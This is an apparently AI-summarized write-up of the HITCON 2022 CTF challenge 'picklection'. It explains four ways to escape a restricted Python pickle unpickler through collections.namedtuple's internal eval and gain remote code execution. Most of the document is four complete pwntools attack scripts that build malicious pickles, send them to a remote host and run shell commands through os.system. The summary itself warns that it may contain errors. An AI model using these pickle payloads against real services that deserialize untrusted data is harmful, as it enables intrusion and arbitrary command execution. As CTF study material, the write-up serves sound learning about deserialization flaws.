# HITCON 2022 picklection

> Summarized by AI from the [HITCON 2022 organizers' writeup](https://hackmd.io/@94y7q597ST2hNdB9lbTJhA/SkCri-pOs), [splitline's writeup](https://blog.splitline.tw/hitcon-ctf-2022/#%F0%9F%A5%92-picklection-misc) ([exploit](https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-quals/2022/misc/Picklection/exp/exploit.py)), and the [NeSE team's writeup](https://nese.team/writeup/hitcon2022.pdf). May contain errors. This challenge uses Python 3.9.13. Challenge archive [here](https://github.com/hitconctf/ctf2022.hitcon.org/releases/download/archive/picklection-0e1ebbc615be72e9c738f3d0c1aad19a95ae000a.zip).

```python
#!/usr/local/bin/python3
import pickle, collections, io

class RestrictedUnpickler(pickle.Unpickler):
     def find_class(self, module, name):
        if module == 'collections' and '__' not in name:
            return getattr(collections, name)
        raise pickle.UnpicklingError('bad')

data = bytes.fromhex(input("(hex)> "))
RestrictedUnpickler(io.BytesIO(data)).load()
```

Requirements:

1. Pickle `find_class` limited to `collections` module without `__`: use `collections.namedtuple` where a malicious field name with RCE reaches `eval` as a default argument expression

`collections.namedtuple` internally calls `eval()` to construct a lambda for `__new__` ([Python 3.9 source](https://github.com/python/cpython/blob/0bbaf5de9744ae1acea3e2c9ad2257d1cc68e847/Lib/collections/__init__.py#L345)):

```python
# Step 1: field_names is converted to a list of strings
if isinstance(field_names, str):
    field_names = field_names.replace(',', ' ').split()
field_names = list(map(str, field_names))      # (A)

# Step 2: validation - each name must be a valid identifier
for name in [typename] + field_names:          # (B)
    if type(name) is not str:
        raise TypeError(...)
    if not name.isidentifier():
        raise ValueError(...)
    if _iskeyword(name):
        raise ValueError(...)

# Step 3: further checks on field names
seen = set()
for name in field_names:                       # (C)
    if name.startswith('_') and not rename:
        raise ValueError(...)
    if name in seen:
        raise ValueError(...)
    seen.add(name)

# Step 4: final processing and eval
field_names = tuple(map(_sys.intern, field_names))  # (D)
arg_list = ', '.join(field_names)                    # (E)
code = f'lambda _cls, {arg_list}: _tuple_new(_cls, ({arg_list}))'
__new__ = eval(code, namespace)                      # (F)
```

To inject a malicious payload into `eval`, we must bypass checks at (B) and (C) while still having the payload end up in `arg_list` at (E). The approaches below override function names in `collections` globals via the `__getattr__` mechanism to achieve this. The namespace at (F) has `__builtins__: {}`, so the payload must obtain real builtins through other means.

## Approach A: `UserDict.__radd__` (organizers)

**How it works:**

1. **Bypass validation**: Set `UserDict.__radd__ = _chain` via `BUILD` slotstate. When `namedtuple` does `[typename] + field_names`, Python tries `list.__add__(field_names)` first, gets `NotImplemented`, then calls `field_names.__radd__([typename])` which is `_chain([typename])`, yielding only `[typename]`. The payload is never visited during the identifier validation loop.

2. **Override `map`/`list`**: Update `_collections_abc.__all__` to include `"map"` and `"list"`, set `_collections_abc.map = defaultdict` and `_collections_abc.list = UserDict`. Accessing `collections.map`/`list` triggers `__getattr__`, injecting them into `collections.__dict__`.

3. **Inject payload**: Call `namedtuple("a", {payload: 0})`. Inside namedtuple:

    - `list(map(str, field_names))` -> `UserDict(defaultdict(str, {payload: 0}))` -- a UserDict with payload as key
    - Validation loop only sees `"a"` (due to `__radd__` trick)
    - `tuple(map(_sys.intern, field_names))` -> `(payload,)` -- payload becomes the sole field name
    - `arg_list = ', '.join(field_names)` -> the payload string
    - `eval(f'lambda _cls, {payload}: ...')` evaluates the default argument expression, executing the command

Attack script:

```python
#!/usr/bin/env python3
from pwn import *
import pickle, struct

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
CMD = sys.argv[3] if len(sys.argv) > 3 else 'cat /home/ctf/flag'

def short_binunicode(s):
    data = s.encode('utf-8'); assert len(data) < 256
    return pickle.SHORT_BINUNICODE + bytes([len(data)]) + data
def stack_global(m, n): return short_binunicode(m) + short_binunicode(n) + pickle.STACK_GLOBAL

p = b''
# setattr(UserDict, "__radd__", _chain) via BUILD slotstate
p += stack_global('collections', 'UserDict') + pickle.MARK + pickle.NONE + pickle.EMPTY_DICT
p += short_binunicode('__radd__') + stack_global('collections', '_chain')
p += pickle.SETITEM + pickle.TUPLE + pickle.BUILD + pickle.POP
# Modify _collections_abc.__all__ via BUILD, set map/list for __getattr__
p += stack_global('collections', '_collections_abc') + pickle.MARK + pickle.EMPTY_DICT
p += short_binunicode('__all__') + pickle.EMPTY_LIST
p += short_binunicode('map'); p += pickle.APPEND
p += short_binunicode('list'); p += pickle.APPEND
p += pickle.SETITEM
p += short_binunicode('map') + stack_global('collections', 'defaultdict') + pickle.SETITEM
p += short_binunicode('list') + stack_global('collections', 'UserDict') + pickle.SETITEM
p += pickle.EMPTY_DICT + pickle.TUPLE + pickle.BUILD + pickle.POP
# Trigger __getattr__ to inject map/list into collections globals
p += stack_global('collections', 'map'); p += pickle.POP
p += stack_global('collections', 'list'); p += pickle.POP
# namedtuple("a", {payload: 0}) -> eval triggers RCE
payload = f"a = ().__class__.__base__.__subclasses__()[84]().load_module('os').system('{CMD}'): 1 #"
p += stack_global('collections', 'namedtuple') + pickle.MARK + short_binunicode('a') + pickle.EMPTY_DICT
p += pickle.BINUNICODE + struct.pack('<I', len(payload)) + payload.encode()
p += pickle.BININT + struct.pack('<i', 0) + pickle.SETITEM + pickle.TUPLE + pickle.REDUCE + pickle.STOP

r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
r.sendline((pickle.PROTO + b'\x04' + p).hex().encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```

## Approach B: UserString manipulation (splitline)

**How it works:**

Instead of `UserDict.__radd__`, this approach manipulates `UserString` and internal functions to redirect the namedtuple flow:

1. **Set up `__getattr__` injectees**: Add `_check_methods`, `_type_repr`, `abstractmethod`, `map`, `tuple`, `str` to `_collections_abc.__all__`. Set corresponding attributes on `_collections_abc` so `__getattr__` injects them into `collections`.

2. **Replace key functions**:

    - `UserString.replace` -> `_check_methods` (class attribute via BUILD slotstate)
    - `UserString.__str__` -> `_type_repr`
    - `Counter_instance.split` -> `_check_methods` (instance attribute)
    - `_check_methods.__defaults__` -> `(abstractmethod,)` (so zero-arg call uses `abstractmethod` as default)
    - `abstractmethod.__mro__` -> `()` (so `getattr` on it returns empty tuple)
    - `_sys.intern` -> `abstractmethod`
    - `_collections_abc.NotImplemented` -> `Counter()` instance (so `_check_methods` returns it instead of raising)

3. **Prepare payload**: Set `Counter_instance.__qualname__ = [payload]` and `Counter_instance.__module__ = "builtins"`. The payload uses `[].__reduce_ex__(3)[0].__globals__["__builtins__"]` to get real builtins without hardcoded subclass indices.

4. **Trigger**: Calling `namedtuple(UserString("x"), UserString("x"))` with all the overrides in place causes the flow to route the payload into the lambda's default argument expression, executing the command.

Attack script:

```python
#!/usr/bin/env python3
from pwn import *
import pickle, struct

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'

P = pickle  # shorthand

class PickleBuilder:
    def __init__(self):
        self.p = P.PROTO + b'\x04'; self.memos = {}; self.next_memo = 0
    def short_binunicode(self, s):
        data = s.encode('utf-8'); assert len(data) < 256
        return P.SHORT_BINUNICODE + bytes([len(data)]) + data
    def stack_global(self, m, n):
        return self.short_binunicode(m) + self.short_binunicode(n) + P.STACK_GLOBAL
    def memoize(self):
        idx = self.next_memo; self.next_memo += 1
        return P.MEMOIZE, idx
    def binget(self, idx):
        return P.BINGET + bytes([idx]) if idx < 256 else P.LONG_BINGET + struct.pack('<I', idx)
    def emit_global(self, m, n, save_as=None):
        b = self.stack_global(m, n)
        if save_as is not None:
            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
        self.p += b
    def get_memo(self, k): return self.binget(self.memos[k])
    def build_slotstate(self, obj, key, value):
        return obj + P.EMPTY_DICT + P.MARK + key + value + P.DICT + P.TUPLE2 + P.BUILD
    def emit_build_slotstate(self, obj, k, v): self.p += self.build_slotstate(obj, k, v)
    def emit_str(self, s, save_as=None):
        b = self.short_binunicode(s)
        if save_as is not None:
            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
        self.p += b
    def empty_tuple(self): return P.EMPTY_TUPLE
    def tuple1(self): return P.TUPLE1
    def tuple2(self): return P.TUPLE2
    def reduce(self): return P.REDUCE
    def mark(self): return P.MARK
    def list_op(self): return P.LIST
    def none(self): return P.NONE
    def stop(self): return P.STOP

def build_exploit():
    pb = PickleBuilder()
    pb.emit_global('collections', 'namedtuple', save_as='namedtuple')
    pb.emit_global('collections', '_collections_abc', save_as='_collections_abc')
    pb.emit_global('collections', '_sys', save_as='_sys')
    pb.emit_global('collections', 'Counter', save_as='Counter')
    pb.emit_global('collections', 'UserString', save_as='UserString')

    pb.p += pb.mark()
    for n in ['_check_methods', '_type_repr', 'abstractmethod', 'map', 'tuple', 'str']:
        pb.p += pb.short_binunicode(n)
    pb.p += pb.list_op() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('__all__'), pb.binget(pb.next_memo - 1))

    for n in ['_check_methods', '_type_repr', 'abstractmethod']:
        pb.emit_global('collections', n, save_as=n)

    # UserString("x") with __mro__ = ()
    pb.p += pb.get_memo('UserString') + pb.short_binunicode('x') \
            + pb.tuple1() + pb.reduce() + pb.memoize()[0]
    us = pb.next_memo - 1
    pb.p += pb.binget(us) + pb.memoize()[0]
    us2 = pb.next_memo - 1
    pb.p += pb.empty_tuple() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.binget(us2), pb.short_binunicode('__mro__'),
                            pb.binget(pb.next_memo - 1))

    # Counter() instances (C1 = NotImplemented, C2 = field_names)
    pb.p += pb.get_memo('Counter') + pb.empty_tuple() + pb.reduce() + pb.memoize()[0]
    c1 = pb.next_memo - 1
    pb.p += pb.binget(c1) + pb.memoize()[0]
    c2 = pb.next_memo - 1

    for target, attr in [('UserString', 'replace'), (c2, 'split')]:
        pb.p += pb.get_memo('_check_methods') + pb.memoize()[0]
        obj = pb.get_memo(target) if isinstance(target, str) else pb.binget(target)
        pb.emit_build_slotstate(obj, pb.short_binunicode(attr), pb.binget(pb.next_memo - 1))

    pb.p += pb.get_memo('abstractmethod') + pb.tuple1() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_check_methods'),
        pb.short_binunicode('__defaults__'), pb.binget(pb.next_memo - 1))
    pb.p += pb.empty_tuple() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('abstractmethod'),
        pb.short_binunicode('__mro__'), pb.binget(pb.next_memo - 1))
    pb.p += pb.get_memo('abstractmethod') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_sys'),
        pb.short_binunicode('intern'), pb.binget(pb.next_memo - 1))

    pb.p += pb.binget(c1) + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('NotImplemented'), pb.binget(pb.next_memo - 1))

    for attr, src in [('map', '_check_methods'), ('tuple', '_type_repr')]:
        pb.p += pb.get_memo(src) + pb.memoize()[0]
        pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
            pb.short_binunicode(attr), pb.binget(pb.next_memo - 1))
    pb.p += pb.get_memo('Counter') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('type'), pb.binget(pb.next_memo - 1))

    pb.emit_str('builtins', save_as='bs')
    pb.emit_build_slotstate(pb.binget(c1), pb.short_binunicode('__module__'),
                            pb.get_memo('bs'))

    pl = f"a=[].__reduce_ex__(3)[0].__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(\"{CMD}\"):0#"
    pb.p += pb.mark() + pb.short_binunicode(pl) + pb.list_op() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.binget(c1), pb.short_binunicode('__qualname__'),
                            pb.binget(pb.next_memo - 1))

    pb.p += pb.get_memo('_type_repr') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('UserString'),
        pb.short_binunicode('__str__'), pb.binget(pb.next_memo - 1))
    pb.p += pb.get_memo('UserString') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('str'), pb.binget(pb.next_memo - 1))

    for n in ['map', 'tuple', 'str']:
        pb.p += pb.stack_global('collections', n)
    pb.p += pb.get_memo('namedtuple') + pb.binget(us2) + pb.binget(us2) \
            + pb.tuple2() + pb.reduce() + pb.none() + pb.stop()
    return pb.p

r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
r.sendline(build_exploit().hex().encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```

## Approach C: ABCMeta + `_tuple_new` redirection (maple3142)

**How it works:**

The key insight: when `namedtuple` executes `_tuple_new = tuple.__new__`, `tuple` is looked up from `collections.__dict__`. If `collections.tuple` has been replaced with a custom class `XC` (via `__getattr__`), then `_tuple_new` becomes `XC.__new__` -- which is set to `_check_methods`, a Python function with `__globals__`. The eval code can then access `_tuple_new.__globals__["__builtins__"]` to get real builtins.

1. Set `_collections_abc.__all__` to include `"_type_repr"`, `"_check_methods"`, `"ABCMeta"`, `"tuple"`. Get `_check_methods` and `ABCMeta` via `__getattr__`.
2. Create `XC = ABCMeta("XC", (), {"__new__": _check_methods})` -- a class whose `__new__` is `_check_methods`.
3. Set `_collections_abc.NotImplemented = [payload]` -- so `_check_methods` returns the payload list when method check fails.
4. Set `_collections_abc.tuple = XC` -- injected into `collections` globals via `__getattr__`.
5. Call `namedtuple('x', [])`. Inside namedtuple, `tuple(...)` resolves to `XC(...)`, calling `_check_methods` which returns the payload list. The payload ends up in `arg_list`. The `#` in the payload comments out the rest, leaving `lambda _cls, a: 1, _tuple_new.__globals__["__builtins__"].__import__("os").system("cmd")` -- a tuple whose second element executes the command.

```python
#!/usr/bin/env python3
from pwn import *
import pickle, struct

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'

P = pickle

class PickleBuilder:
    def __init__(self):
        self.p = P.PROTO + b'\x04'; self.memos = {}; self.next_memo = 0
    def short_binunicode(self, s):
        data = s.encode('utf-8'); assert len(data) < 256
        return P.SHORT_BINUNICODE + bytes([len(data)]) + data
    def stack_global(self, m, n):
        return self.short_binunicode(m) + self.short_binunicode(n) + P.STACK_GLOBAL
    def memoize(self):
        idx = self.next_memo; self.next_memo += 1
        return P.MEMOIZE, idx
    def binget(self, idx):
        return P.BINGET + bytes([idx]) if idx < 256 else P.LONG_BINGET + struct.pack('<I', idx)
    def emit_global(self, m, n, save_as=None):
        b = self.stack_global(m, n)
        if save_as is not None:
            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
        self.p += b
    def get_memo(self, k): return self.binget(self.memos[k])
    def build_slotstate(self, obj, key_val_pairs):
        b = obj + P.EMPTY_DICT + P.MARK
        for k, v in key_val_pairs:
            b += k + v
        b += P.DICT + P.TUPLE2 + P.BUILD
        return b
    def emit_build_slotstate(self, obj, kvs): self.p += self.build_slotstate(obj, kvs)
    def mark(self): return P.MARK
    def list_op(self): return P.LIST
    def tuple_op(self): return P.TUPLE
    def reduce(self): return P.REDUCE
    def none(self): return P.NONE
    def stop(self): return P.STOP
    def setitem(self): return P.SETITEM

pb = PickleBuilder()
pb.emit_global('collections', 'namedtuple', save_as='namedtuple')
pb.emit_global('collections', '_collections_abc', save_as='abc')
pb.emit_build_slotstate(pb.get_memo('abc'),
    [(pb.short_binunicode('__all__'),
      pb.mark() + (pb.short_binunicode('_type_repr') + pb.short_binunicode('_check_methods')
                   + pb.short_binunicode('ABCMeta') + pb.short_binunicode('tuple'))
      + pb.list_op())])
for name in ['_check_methods', 'ABCMeta']:
    pb.emit_global('collections', name, save_as=name)

# XC = ABCMeta("XC", (), {"__new__": _check_methods})
pb.p += pb.get_memo('ABCMeta') + pb.mark()
pb.p += pb.short_binunicode('XC') + P.EMPTY_TUPLE + P.EMPTY_DICT
pb.p += pb.short_binunicode('__new__') + pb.get_memo('_check_methods')
pb.p += pb.setitem() + pb.tuple_op() + pb.reduce() + pb.memoize()[0]
xc_idx = pb.next_memo - 1

payload = f'a: 1,_tuple_new.__globals__["__builtins__"]["__import__"]("os").system("{CMD}")#'
pb.emit_build_slotstate(pb.get_memo('abc'),
    [(pb.short_binunicode('NotImplemented'),
      pb.mark() + pb.short_binunicode(payload) + pb.list_op())])
pb.emit_build_slotstate(pb.get_memo('abc'),
    [(pb.short_binunicode('tuple'), pb.binget(xc_idx))])

pb.p += pb.stack_global('collections', 'tuple') + P.POP
pb.p += pb.get_memo('namedtuple') + pb.mark()
pb.p += pb.short_binunicode('x') + P.EMPTY_TUPLE
pb.p += pb.tuple_op() + pb.reduce() + pb.none() + pb.stop()

r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
r.sendline(pb.p.hex().encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```

## Approach D: `_itemgetter` + `namedtuple.__kwdefaults__` (NeSE team)

**How it works:**

From the [NeSE team's writeup](https://nese.team/writeup/hitcon2022.pdf). The trick: `list(map(str, field_names))` and `tuple(map(_sys.intern, field_names))` use different overrides for `list` and `tuple`, so validation sees a benign name while the payload goes to `eval`.

1. Create `ig2 = _itemgetter(2)`, `ig3 = _itemgetter(3)`. These extract specific indices from sequences.
2. Build a `defaults` list `['', '', ['z'], [payload]]` and set `namedtuple.__kwdefaults__` so a subsequent `namedtuple('b', ['b1','b2','b3','b4'])` uses them.
3. Create `tuple2 = namedtuple('b', ['b1','b2','b3','b4'])` -- a namedtuple with 4 fields where the last 2 have defaults `['z']` and `[payload]`.
4. Replace `collections.map` -> `tuple2`, `collections.list` -> `_itemgetter(2)`, `collections.tuple` -> `_itemgetter(3)` via `_collections_abc.__all__`.

Inside `namedtuple('a', [])`:

- `list(map(str, field_names))` -> `_itemgetter(2)(tuple2(str, []))` -> `['z']` (passes validation)
- `tuple(map(_sys.intern, field_names))` -> `_itemgetter(3)(tuple2(sys.intern, ['z']))` -> `[payload]`
- `arg_list = payload` -> `lambda _cls, z=EXPLOIT:0` -- eval executes the default argument

```python
#!/usr/bin/env python3
from pwn import *
import pickle, struct

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'

P = pickle

class PickleBuilder:
    def __init__(self):
        self.p = P.PROTO + b'\x04'; self.memos = {}; self.next_memo = 0
    def short_binunicode(self, s):
        data = s.encode('utf-8'); assert len(data) < 256
        return P.SHORT_BINUNICODE + bytes([len(data)]) + data
    def stack_global(self, m, n):
        return self.short_binunicode(m) + self.short_binunicode(n) + P.STACK_GLOBAL
    def memoize(self):
        idx = self.next_memo; self.next_memo += 1
        return P.MEMOIZE, idx
    def binget(self, idx):
        return P.BINGET + bytes([idx]) if idx < 256 else P.LONG_BINGET + struct.pack('<I', idx)
    def emit_global(self, m, n, save_as=None):
        b = self.stack_global(m, n)
        if save_as is not None:
            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
        self.p += b
    def get_memo(self, k): return self.binget(self.memos[k])
    def mark(self): return P.MARK
    def list_op(self): return P.LIST
    def tuple_op(self): return P.TUPLE
    def tuple2(self): return P.TUPLE2
    def reduce(self): return P.REDUCE
    def none(self): return P.NONE
    def stop(self): return P.STOP
    def pop(self): return P.POP
    def empty_dict(self): return P.EMPTY_DICT
    def dict_op(self): return P.DICT
    def build(self): return P.BUILD

pb = PickleBuilder()
pb.emit_global('collections', 'namedtuple', save_as='nt')
pb.emit_global('collections', '_itemgetter', save_as='ig')
pb.emit_global('collections', '_collections_abc', save_as='abc')

# _itemgetter(2) and _itemgetter(3)
pb.p += pb.get_memo('ig') + pb.mark() + P.BININT1 + b'\x02' + pb.tuple_op() + pb.reduce() + pb.memoize()[0]
ig2 = pb.next_memo - 1
pb.p += pb.get_memo('ig') + pb.mark() + P.BININT1 + b'\x03' + pb.tuple_op() + pb.reduce() + pb.memoize()[0]
ig3 = pb.next_memo - 1

# defaults: ['', '', ['z'], [payload]]
payload_str = f"z=[].__str__.__objclass__.__subclasses__()[80].acquire.__globals__['sys'].modules['os'].system('{CMD}'):0#"
pb.p += pb.mark()
pb.p += pb.short_binunicode('') + pb.short_binunicode('')
pb.p += pb.mark() + pb.short_binunicode('z') + pb.list_op()
pb.p += pb.mark() + pb.short_binunicode(payload_str) + pb.list_op()
pb.p += pb.list_op() + pb.memoize()[0]
dlist = pb.next_memo - 1

# __kwdefaults__ dict
pb.p += pb.mark()
pb.p += pb.short_binunicode('defaults') + pb.binget(dlist)
pb.p += pb.short_binunicode('rename') + P.FALSE
pb.p += pb.short_binunicode('module') + P.NONE
pb.p += pb.dict_op() + pb.memoize()[0]
kw_idx = pb.next_memo - 1

# setattr(namedtuple, "__kwdefaults__", kw_dict) via BUILD slotstate
pb.p += pb.get_memo('nt') + pb.empty_dict() + pb.mark()
pb.p += pb.short_binunicode('__kwdefaults__') + pb.binget(kw_idx)
pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()

# tuple2 = namedtuple('b', ['b1','b2','b3','b4'])
pb.p += pb.get_memo('nt') + pb.mark()
pb.p += pb.short_binunicode('b')
pb.p += pb.mark() + pb.short_binunicode('b1') + pb.short_binunicode('b2') + pb.short_binunicode('b3') + pb.short_binunicode('b4') + pb.list_op()
pb.p += pb.tuple_op() + pb.reduce() + pb.memoize()[0]
tuple2 = pb.next_memo - 1

# Modify _collections_abc
pb.p += pb.get_memo('abc') + pb.empty_dict() + pb.mark()
pb.p += pb.short_binunicode('__all__')
pb.p += pb.mark() + pb.short_binunicode('map') + pb.short_binunicode('list') + pb.short_binunicode('tuple') + pb.list_op()
pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()
for attr, val in [('map', tuple2), ('list', ig2), ('tuple', ig3)]:
    pb.p += pb.get_memo('abc') + pb.empty_dict() + pb.mark()
    pb.p += pb.short_binunicode(attr) + pb.binget(val)
    pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()

# Trigger __getattr__ for map, list, tuple
for name in ['map', 'list', 'tuple']:
    pb.p += pb.stack_global('collections', name) + pb.pop()

# Reset __kwdefaults__['defaults'] = None
pb.p += pb.mark()
pb.p += pb.short_binunicode('defaults') + P.NONE
pb.p += pb.short_binunicode('rename') + P.FALSE
pb.p += pb.short_binunicode('module') + P.NONE
pb.p += pb.dict_op() + pb.memoize()[0]
pb.p += pb.get_memo('nt') + pb.empty_dict() + pb.mark()
pb.p += pb.short_binunicode('__kwdefaults__') + pb.binget(pb.next_memo - 1)
pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()

# namedtuple('a', []) -- triggers RCE
pb.p += pb.get_memo('nt') + pb.mark()
pb.p += pb.short_binunicode('a') + pb.mark() + pb.list_op()
pb.p += pb.tuple_op() + pb.reduce() + pb.none() + pb.stop()

r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
r.sendline(pb.p.hex().encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```
